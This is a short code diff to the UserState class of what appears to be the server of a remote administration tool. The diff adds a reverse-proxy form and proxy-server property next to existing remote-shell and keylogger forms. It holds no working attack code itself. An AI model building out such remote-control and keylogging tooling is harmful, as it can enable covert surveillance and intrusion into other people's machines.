@@ -1,5 +1,6 @@
 ﻿using System.Drawing;
 using xServer.Core.Helper;
+using xServer.Core.ReverseProxy;
 using xServer.Forms;
 
 namespace xServer.Core
@@ -23,7 +24,8 @@ namespace xServer.Core
         public FrmRemoteShell FrmRs { get; set; }
         public FrmStartupManager FrmStm { get; set; }
         public FrmKeylogger FrmKl { get; set; }
-
+        public FrmReverseProxy FrmProxy { get; set; }
+        
         public bool IsAuthenticated { get; set; }
         public bool LastDesktopSeen { get; set; }
         public bool LastDirectorySeen { get; set; }
@@ -31,6 +33,8 @@ namespace xServer.Core
         public int LastMonitor { get; set; }
         public Bitmap LastDesktop { get; set; }
         public UnsafeStreamCodec StreamCodec { get; set; }
+
+        public ReverseProxyServer ProxyServer { get; set; }
 
         public UserState()
         {
@@ -59,6 +63,8 @@ namespace xServer.Core
                 FrmStm.Close();
             if (FrmKl != null)
                 FrmKl.Close();
+            if (FrmProxy != null)
+                FrmProxy.Close();
         }
     }
 }
